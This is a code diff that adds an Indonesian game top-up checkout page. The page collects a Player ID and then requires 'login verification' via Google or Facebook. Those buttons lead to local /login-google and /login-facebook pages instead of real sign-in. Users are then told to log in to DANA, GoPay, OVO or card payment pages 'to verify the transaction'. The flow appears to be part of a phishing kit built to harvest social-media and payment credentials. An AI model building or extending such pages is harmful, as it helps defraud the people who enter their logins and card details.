@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Checkout - Konfirmasi ID </title>
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="icon" href="/images/favicon.png" type="image/png">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700;800&display=swap" rel="stylesheet">
+</head>
+<body style="background: white;">
+    <div class="container" style="max-width: 500px; margin: 100px auto; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); background: white;">
+        <div id="step-id">
+            <h2 style="margin-bottom: 10px; font-weight: 800; color: var(--primary-blue);">KONFIRMASI AKUN</h2>
+            <p style="color: var(--text-muted); margin-bottom: 30px;">Silakan masukkan ID Pemain (Player ID) untuk melanjutkan top-up.</p>
+            
+            <form id="checkoutForm">
+                <div style="margin-bottom: 25px;">
+                    <label style="display: block; margin-bottom: 8px; font-weight: 600; font-size: 0.9rem;">ID PEMAIN (PLAYER ID)</label>
+                    <input type="text" id="playerId" placeholder="Contoh: 12345678" required style="width: 100%; padding: 15px; border: 1px solid #ddd; border-radius: 12px; font-size: 1rem; outline: none; transition: 0.3s;">
+                </div>
+                
+                <p style="font-weight: 700; margin-bottom: 15px; font-size: 0.9rem;">PILIH METODE VERIFIKASI LOGIN:</p>
+                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
+                    <button type="button" onclick="goToLogin('google')" style="padding: 12px; border: 1px solid #ddd; background: #fff; border-radius: 12px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; font-weight: 600;">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" height="20"> Google
+                    </button>
+                    <button type="button" onclick="goToLogin('facebook')" style="padding: 12px; border: 1px solid #1877f2; background: #1877f2; color: white; border-radius: 12px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; font-weight: 600;">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" height="20"> Facebook
+                    </button>
+                </div>
+            </form>
+        </div>
+
+        <div id="step-payment" style="display: none;">
+            <h2 style="margin-bottom: 10px; font-weight: 800; color: var(--primary-color);">KONFIRMASI PEMBAYARAN</h2>
+            <p style="color: var(--text-muted); margin-bottom: 30px;">Login ke akun pembayaran Anda untuk memverifikasi transaksi.</p>
+            
+            <div style="display: grid; grid-template-columns: 1fr; gap: 15px;">
+                <button type="button" onclick="window.location.href='/payment-dana'" style="padding: 15px; border: 1px solid #008fee; background: #008fee; color: white; border-radius: 12px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; font-weight: 900;">
+                    <img src="/images/payment-methods/dana.png" height="20" style="filter: brightness(0) invert(1);"> LANJUT DANA
+                </button>
+                <button type="button" onclick="window.location.href='/payment-card'" style="padding: 15px; border: 1px solid #ddd; background: #fff; border-radius: 12px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; font-weight: 700;">
+                    <img src="/images/payment-methods/visa.png" height="15"> KARTU KREDIT/DEBIT
+                </button>
+            </div>
+        </div>
+    </div>
+    <script>
+        // Handling step-based UI and redirects
+        const urlParams = new URLSearchParams(window.location.search);
+        const step = urlParams.get('step');
+        const isLoggedIn = localStorage.getItem('isLoggedIn');
+
+        if(step === 'payment') {
+            if(!isLoggedIn) {
+                // Not logged in but trying to see payment? Redirect back to login step
+                window.location.href = '/checkout';
+            } else {
+                // Logged in! Proceed to auto-redirect or manual choice
+                const selectedMethod = localStorage.getItem('paymentMethod');
+                if(selectedMethod) {
+                    if(selectedMethod === 'gopay') window.location.href = '/payment-gopay';
+                    else if(selectedMethod === 'dana') window.location.href = '/payment-dana';
+                    else if(selectedMethod === 'visa') window.location.href = '/payment-card';
+                    else if(selectedMethod === 'ovo') window.location.href = '/payment-ovo';
+                    else {
+                        document.getElementById('step-id').style.display = 'none';
+                        document.getElementById('step-payment').style.display = 'block';
+                    }
+                } else {
+                    document.getElementById('step-id').style.display = 'none';
+                    document.getElementById('step-payment').style.display = 'block';
+                }
+            }
+        }
+
+        function goToLogin(type) {
+            const pid = document.getElementById('playerId').value;
+            if(!pid) return alert('Harap masukkan ID Pemain!');
+            localStorage.setItem('playerId', pid);
+            window.location.href = `/login-${type}`;
+        }
+    </script>
+</body>
+</html>
